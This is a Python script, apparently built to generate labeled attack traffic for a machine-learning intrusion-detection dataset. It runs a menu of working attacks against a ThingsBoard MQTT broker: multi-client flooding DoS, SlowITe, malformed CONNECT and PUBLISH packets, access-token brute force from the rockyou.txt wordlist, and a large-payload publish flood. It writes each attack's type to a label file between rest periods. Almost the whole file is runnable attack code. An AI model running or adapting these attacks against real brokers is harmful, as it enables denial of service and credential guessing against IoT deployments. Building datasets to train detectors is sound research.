import paho.mqtt.client as mqtt
import time
import random
import os
import json
import sys

# Increase the limit for integer string conversion to handle large message sizes
sys.set_int_max_str_digits(100000)  # Adjust this value if necessary

# Define the MQTT broker, port, and topic for ThingsBoard
broker = "192.168.9.237"  # Replace with your ThingsBoard server IP or hostname
port = 1883
mqtt_topic = "v1/devices/me/telemetry"  # Topic designed to send messages to devices
access_token = "Attack"  # Replace with your ThingsBoard access token

# File to store the current attack type
attack_file = 'Y:\\ml\\current_attack.txt'

# Current directory for payloads
current_dir = os.path.dirname(os.path.abspath(__file__))
payload_file = os.path.join(current_dir, 'big.txt')
password_file = os.path.join(current_dir, 'rockyou.txt')

# ====================================================================
# List of malformed PUBLISH messages (binary data)
# ====================================================================
malformed_publish_messages = [
    b'\x30\x39\x00\x0f\x6d\x79\x2f\x74\x6f\x70\x69\x63\x2f\x23\x20\x6d\x61\x6c\x66\x6f\x72\x6d\x65\x64',  # Invalid topic
    b'\x31\x39\x00\x0a\x6a\x75\x6e\x6b\x2f\x68\x65\x61\x64\x65\x72\x23\x20\x65\x78\x74\x72\x61',          # Incorrect flags
    b'\x32\x30\x00\x1e\x70\x61\x79\x6c\x6f\x61\x64\x2f\x73\x74\x61\x72\x74\x2f\x23\x20\x64\x61\x74\x61'   # Invalid payload
]

# ====================================================================
# List of malformed CONNECT packets (invalid binary data)
# ====================================================================
malformed_connect_packets = [
    b'\x10\x1E\x00\x04\x4D\x51\x54\x54\x05\x02\x00\x3C\x00\x00',  # Incorrect protocol level (MQTT version 5)
    b'\x10\x30\x00\x04\x4D\x51\x54\x54\x04\xF2\x00\x3C\x00\x06\x6D\x79\x63\x6C\x69\x65\x6E\x74',  # Invalid flag bit (F2)
    b'\x10\x00\x00\x00\x00\x00\x00\x00\x00'  # Completely invalid CONNECT structure
]

# ====================================================================
# Function to write the current attack type to a file
# ====================================================================
def write_attack_type(attack_type):
    with open(attack_file, 'w') as f:
        f.write(attack_type)

# ====================================================================
# MQTT connection function
# ====================================================================
def on_connect(client, userdata, flags, rc):
    print(f"Client {client._client_id.decode()} connected to broker with result code {rc}")

# ====================================================================
# Function to handle client reconnection attempts
# ====================================================================
def reconnect_client(client):
    try:
        client.reconnect()
        print("Reconnected successfully.")
    except Exception as e:
        print(f"Failed to reconnect: {e}")

# ====================================================================
# Function to simulate rest periods (legitimate traffic)
# ====================================================================
def rest_period(duration):
    write_attack_type('legitimate')
    print(f"Resting for {duration // 60 if duration >= 60 else duration} {'minute' if duration >= 60 else 'seconds'} (legitimate traffic scenario)...")
    time.sleep(duration)

# ====================================================================
# FLOODING DoS ATTACK
# ====================================================================
def flooding_dos_attack(duration, high_performance=True):
    write_attack_type('dos')
    num_clients = 100 if not high_performance else 200
    message_size_range = (700, 2000) if not high_performance else (8000, 12000)
    clients = []
    for i in range(num_clients):
        client = mqtt.Client(f"attacker_client_{i}")
        client.on_connect = on_connect
        client.username_pw_set(access_token)
        client.connect(broker, port, 60)
        clients.append(client)

    attack_start = time.time()
    try:
        while time.time() - attack_start < duration:
            for client in clients:
                message_size = random.randint(*message_size_range)
                payload = {"data": f"{random.getrandbits(message_size)}"}
                client.publish(mqtt_topic, str(payload), qos=2)
                time.sleep(0.0005 if high_performance else 0.01)
    except KeyboardInterrupt:
        print("Flooding DoS attack stopped")

# ====================================================================
# SLOWITe ATTACK
# ====================================================================
def slowite_attack(duration, qos_level=2, high_performance=True):
    write_attack_type('slowite')
    num_clients = 50 if not high_performance else 100
    message_size_range = (25669, 30000) if not high_performance else (35000, 50000)
    clients = []
    for i in range(num_clients):
        client = mqtt.Client(f"attacker_client_{i}")
        client.on_connect = on_connect
        client.username_pw_set(access_token)
        client.connect(broker, port, 60)
        clients.append(client)

    attack_start = time.time()
    try:
        while time.time() - attack_start < duration:
            for client in clients:
                message_size = random.randint(*message_size_range)
                payload = {"data": f"{random.getrandbits(message_size)}"}
                client.publish(mqtt_topic, str(payload), qos=qos_level)
                time.sleep(0.5 if not high_performance else 0.05)
    except KeyboardInterrupt:
        print("SlowITe attack stopped")

# ====================================================================
# MALFORMED DATA ATTACK
# ====================================================================
def malformed_data_attack(duration, high_performance=True):
    write_attack_type('malformed')
    num_clients = 100 if not high_performance else 200
    clients = []
    for i in range(num_clients):
        client = mqtt.Client(f"attacker_client_{i}")
        client.on_connect = on_connect
        client.username_pw_set(access_token)
        try:
            client.connect(broker, port, 60)
        except Exception as e:
            print(f"Error connecting client {i}: {e}")
        clients.append(client)

    attack_start = time.time()
    try:
        while time.time() - attack_start < duration:
            for client in clients:
                # Randomly choose between sending malformed CONNECT and PUBLISH packets
                if random.choice([True, False]):
                    malformed_connect_attack(client)
                else:
                    malformed_publish_attack(client)
                time.sleep(0.01 if high_performance else 0.1)
    except KeyboardInterrupt:
        print("Malformed Data attack stopped")

# ====================================================================
# Function to send malformed CONNECT packets with random conflags
# ====================================================================
def malformed_connect_attack(client, high_performance=True):
    try:
        # Manipulate the mqtt_conflags with random flag combinations
        conflags_options = [0x02, 0x04, 0x10, 0x08]  # Clean session, will flag, password flag, etc.
        conflags = random.choice(conflags_options)
        packet = b'\x10' + bytes([conflags]) + random.getrandbits(16).to_bytes(2, 'big')  # Randomized CONNECT packet

        # Randomly choose between predefined malformed CONNECT packets or random conflags
        if random.choice([True, False]):
            packet = random.choice(malformed_connect_packets)  # Send a predefined malformed CONNECT packet

        # Check if the socket is valid before sending
        if client.socket() is not None:
            client.socket().send(packet)
            print(f"Sent malformed CONNECT packet with conflags={conflags}.")
        else:
            print("Socket is not valid, attempting reconnection.")
            reconnect_client(client)

    except Exception as e:
        print(f"Error during malformed CONNECT attack: {e}")
        reconnect_client(client)  # Try to reconnect

# ====================================================================
# Function to send malformed PUBLISH packets with random hdrflags
# ====================================================================
def malformed_publish_attack(client, high_performance=True):
    try:
        # Manipulate mqtt_hdrflags and simulate duplication by sending the same message
        hdrflags_options = [0x01, 0x02, 0x04, 0x08, 0x20]  # Retain, QoS 1, QoS 2, DUP, invalid combinations
        hdrflags = random.choice(hdrflags_options)
        
        # Choose a payload or use a large random message
        if high_performance:
            payload = {"data": f"{random.getrandbits(random.randint(8000, 12000))}"}  # Large message in high-performance mode
        else:
            payload = random.choice(malformed_publish_messages)  # Predefined malformed PUBLISH packet

        # Publish the malformed payload with QoS 2 and manipulated flags
        client.publish(mqtt_topic, str(payload), qos=2, retain=bool(hdrflags & 0x01))
        print(f"Sent malformed PUBLISH packet with hdrflags={hdrflags}.")

    except Exception as e:
        print(f"Error during malformed PUBLISH attack: {e}")
        reconnect_client(client)  # Try to reconnect if connection is lost

# ====================================================================
# BRUTE FORCE ATTACK (updated version)
# ====================================================================
def brute_force_attack(wordlist_path, sleep_time, high_performance):
    attack_type = "bruteforce"
    write_attack_type(attack_type)

    try:
        with open(wordlist_path, 'r', encoding="latin-1") as file:
            tokens = file.readlines()

        attempt = 0
        num_clients = 200 if high_performance else 100  # Adjust clients based on performance
        for token in tokens[:num_clients]:
            access_token_brute_force = token.strip()
            try:
                # Set up the MQTT client with the current access token
                client = setup_mqtt_client(f"BruteForce_Client_{attempt}", access_token_brute_force)

                # Publish a message about the current attempt
                payload = json.dumps({"attack_type": "Brute Force Attack", "message": f"Attempt with access token: {access_token_brute_force}"})
                client.publish(mqtt_topic, payload)

                # Verify if the connection was successful (CONNACK return code 0 means success)
                if client.is_connected():
                    print(f"Success: Connected with token {access_token_brute_force}")
                else:
                    print(f"Failed with token {access_token_brute_force}, connection not established")

                # Disconnect the client after each attempt
                client.disconnect()

            except Exception as e:
                print(f"Failed attempt with access token '{access_token_brute_force}': {e}")
            attempt += 1
            time.sleep(sleep_time)

    except KeyboardInterrupt:
        print("Brute Force attack interrupted. Exiting...")
    except FileNotFoundError:
        print(f"Error: Wordlist file '{wordlist_path}' not found.")
    except Exception as e:
        print(f"An error occurred during the brute force attack: {e}")

# Helper function to set up MQTT client with access token
def setup_mqtt_client(client_id, access_token):
    client = mqtt.Client(client_id)
    client.username_pw_set(access_token)  # Use the access token as the username
    client.connect(broker, port, 60)
    return client

# ====================================================================
# MQTT PUBLISH FLOOD ATTACK
# ====================================================================
def mqtt_publish_flood_attack(duration, high_performance=True):
    write_attack_type('flood')
    large_payload = load_large_payload()
    client = mqtt.Client("flood_attacker_single_client")
    client.on_connect = on_connect
    client.username_pw_set(access_token)
    client.connect(broker, port, 60)
    client.loop_start()
    attack_start = time.time()
    try:
        while time.time() - attack_start < duration:
            client.publish(mqtt_topic, large_payload[:50000], qos=2)
            time.sleep(0.00001 if high_performance else 0.001)
    except KeyboardInterrupt:
        print("MQTT Publish Flood attack stopped")
    finally:
        client.loop_stop()
        client.disconnect()

# ====================================================================
# Function to load a large payload for MQTT Publish Flood Attack
# ====================================================================
def load_large_payload():
    with open(payload_file, 'r') as f:
        return f.read()

# ====================================================================
# Function to execute each attack and switch between them
# ====================================================================
def run_all_attacks(scenarios, wordlist_path):
    while True:  # Loop indefinitely until stopped manually
        for scenario in scenarios:
            attack_duration = scenario['attack_duration']
            rest_duration = scenario['rest_duration']
            
            # ====================================================================
            # Phase 1: High-performance Flooding DoS Attack
            # ====================================================================
            print(f"Starting {attack_duration} seconds High-Performance Flooding DoS attack...")
            flooding_dos_attack(attack_duration, high_performance=True)
            
            # Phase 2: Rest period (legitimate traffic)
            rest_period(rest_duration)
            
            # Phase 3: Low-performance Flooding DoS Attack
            print(f"Starting {attack_duration} seconds Low-Performance Flooding DoS attack...")
            flooding_dos_attack(attack_duration, high_performance=False)
            
            # Phase 4: Another rest period
            rest_period(rest_duration)
        rest_period(120)  # 2-minute rest after all attack scenarios

        for scenario in scenarios:
            attack_duration = scenario['attack_duration']
            rest_duration = scenario['rest_duration']

            # ====================================================================
            # Phase 1: High-performance SlowITe Attack
            # ====================================================================
            print(f"Starting {attack_duration} seconds High-Performance SlowITe attack...")
            slowite_attack(attack_duration, qos_level=2, high_performance=True)
            
            # Phase 2: Rest period (legitimate traffic)
            rest_period(rest_duration)
            
            # Phase 3: Low-performance SlowITe Attack
            print(f"Starting {attack_duration} seconds Low-Performance SlowITe attack...")
            slowite_attack(attack_duration, qos_level=0, high_performance=False)
            
            # Phase 4: Another rest period
            rest_period(rest_duration)
        rest_period(120)  # 2-minute rest after all attack scenarios
        for scenario in scenarios:
            attack_duration = scenario['attack_duration']
            rest_duration = scenario['rest_duration']

            # ====================================================================
            # Phase 1: High-performance Malformed Data Attack
            # ====================================================================
            print(f"Starting {attack_duration} seconds High-Performance Malformed Data attack...")
            malformed_data_attack(attack_duration, high_performance=True)
            
            # Phase 2: Rest period (legitimate traffic)
            rest_period(rest_duration)
            
            # Phase 3: Low-performance Malformed Data Attack
            print(f"Starting {attack_duration} seconds Low-Performance Malformed Data attack...")
            malformed_data_attack(attack_duration, high_performance=False)
            
            # Phase 4: Another rest period
            rest_period(rest_duration)
        rest_period(120)  # 2-minute rest after all attack scenarios
        for scenario in scenarios:
            attack_duration = scenario['attack_duration']
            rest_duration = scenario['rest_duration']

            # ====================================================================
            # Phase 1: High-performance Brute Force Attack
            # ====================================================================
            print(f"Starting {attack_duration} seconds High-Performance Brute Force attack...")
            brute_force_attack(wordlist_path, sleep_time=0.0005, high_performance=True)
            
            # Phase 2: Rest period (legitimate traffic)
            rest_period(rest_duration)
            
            # Phase 3: Low-performance Brute Force Attack
            print(f"Starting {attack_duration} seconds Low-Performance Brute Force attack...")
            brute_force_attack(wordlist_path, sleep_time=0.01, high_performance=False)
            
            # Phase 4: Another rest period
            rest_period(rest_duration)
        rest_period(120)  # 2-minute rest after all attack scenarios
        for scenario in scenarios:
            attack_duration = scenario['attack_duration']
            rest_duration = scenario['rest_duration']

            # ====================================================================
            # Phase 1: High-performance MQTT Publish Flood Attack
            # ====================================================================
            print(f"Starting {attack_duration} seconds High-Performance MQTT Publish Flood attack...")
            mqtt_publish_flood_attack(attack_duration, high_performance=True)
            
            # Phase 2: Rest period (legitimate traffic)
            rest_period(rest_duration)
            
            # Phase 3: Low-performance MQTT Publish Flood Attack
            print(f"Starting {attack_duration} seconds Low-Performance MQTT Publish Flood attack...")
            mqtt_publish_flood_attack(attack_duration, high_performance=False)
            
            # Phase 4: Another rest period
            rest_period(rest_duration)
        rest_period(120)  # 2-minute rest after all attack scenarios


# ====================================================================
# Main execution
# ====================================================================
if __name__ == "__main__":
    scenarios = [
        {'attack_duration': 10, 'rest_duration': 10},
        {'attack_duration': 20, 'rest_duration': 20},
        {'attack_duration': 30, 'rest_duration': 30},
        {'attack_duration': 40, 'rest_duration': 40},
        {'attack_duration': 50, 'rest_duration': 50},
        {'attack_duration': 60, 'rest_duration': 60},
    ]

    # Path to the wordlist file
    wordlist_file_path = password_file  # Adjust the path as needed

    # Choose whether to run all attacks or just one
    print("Choose attack to run:")
    print("1: Flooding DoS")
    print("2: SlowITe")
    print("3: Malformed Data")
    print("4: Brute Force")
    print("5: MQTT Publish Flood")
    print("6: Run All Attacks")

    choice = input("Enter the number of your choice: ")

    if choice == "1":
        
        for scenario in scenarios:
            attack_duration = scenario['attack_duration']
            rest_duration = scenario['rest_duration']

            # Phase 1: High-performance Flooding DoS Attack
            print(f"Starting {attack_duration} seconds High-Performance Flooding DoS attack...")
            flooding_dos_attack(attack_duration, high_performance=True)

            # Phase 2: Rest period (legitimate traffic)
            rest_period(rest_duration)

            # Phase 3: Low-performance Flooding DoS Attack
            print(f"Starting {attack_duration} seconds Low-Performance Flooding DoS attack...")
            flooding_dos_attack(attack_duration, high_performance=False)

            # Phase 4: Another rest period
            rest_period(rest_duration)
        print("\nExecution stopped of dos by user.")
    elif choice == "2":
        
        for scenario in scenarios:
            attack_duration = scenario['attack_duration']
            rest_duration = scenario['rest_duration']

            # Phase 1: High-performance SlowITe Attack
            print(f"Starting {attack_duration} seconds High-Performance SlowITe attack...")
            slowite_attack(attack_duration, qos_level=2, high_performance=True)

            # Phase 2: Rest period (legitimate traffic)
            rest_period(rest_duration)

            # Phase 3: Low-performance SlowITe Attack
            print(f"Starting {attack_duration} seconds Low-Performance SlowITe attack...")
            slowite_attack(attack_duration, qos_level=0, high_performance=False)

            # Phase 4: Another rest period
            rest_period(rest_duration)
        print("\nExecution stopped of slowite by user.")
    elif choice == "3":
        
        for scenario in scenarios:
            attack_duration = scenario['attack_duration']
            rest_duration = scenario['rest_duration']

            # Phase 1: High-performance Malformed Data Attack
            print(f"Starting {attack_duration} seconds High-Performance Malformed Data attack...")
            malformed_data_attack(attack_duration, high_performance=True)

            # Phase 2: Rest period (legitimate traffic)
            rest_period(rest_duration)

            # Phase 3: Low-performance Malformed Data Attack
            print(f"Starting {attack_duration} seconds Low-Performance Malformed Data attack...")
            malformed_data_attack(attack_duration, high_performance=False)

            # Phase 4: Another rest period
            rest_period(rest_duration)
        print("\nExecution stopped of malformed by user.")
    elif choice == "4":
        
        for scenario in scenarios:
            attack_duration = scenario['attack_duration']
            rest_duration = scenario['rest_duration']

            # Phase 1: High-performance Brute Force Attack
            print(f"Starting {attack_duration} seconds High-Performance Brute Force attack...")
            brute_force_attack(wordlist_file_path, sleep_time=0.0005, high_performance=True)

            # Phase 2: Rest period (legitimate traffic)
            rest_period(rest_duration)

            # Phase 3: Low-performance Brute Force Attack
            print(f"Starting {attack_duration} seconds Low-Performance Brute Force attack...")
            brute_force_attack(wordlist_file_path, sleep_time=0.01, high_performance=False)

            # Phase 4: Another rest period
            rest_period(rest_duration)
        print("\nExecution stopped of brute_force by user.")

    elif choice == "5":
        
        for scenario in scenarios:
            attack_duration = scenario['attack_duration']
            rest_duration = scenario['rest_duration']

            # Phase 1: High-performance MQTT Publish Flood Attack
            print(f"Starting {attack_duration} seconds High-Performance MQTT Publish Flood attack...")
            mqtt_publish_flood_attack(attack_duration, high_performance=True)

            # Phase 2: Rest period (legitimate traffic)
            rest_period(rest_duration)

            # Phase 3: Low-performance MQTT Publish Flood Attack
            print(f"Starting {attack_duration} seconds Low-Performance MQTT Publish Flood attack...")
            mqtt_publish_flood_attack(attack_duration, high_performance=False)

            # Phase 4: Another rest period
            rest_period(rest_duration)
        print("\nExecution stopped of flood by user.")

    elif choice == "6":
        try:
            run_all_attacks(scenarios, wordlist_file_path)
        except KeyboardInterrupt:
            print("\nExecution stopped by user.")

    else:
        print("Invalid choice. Exiting.")
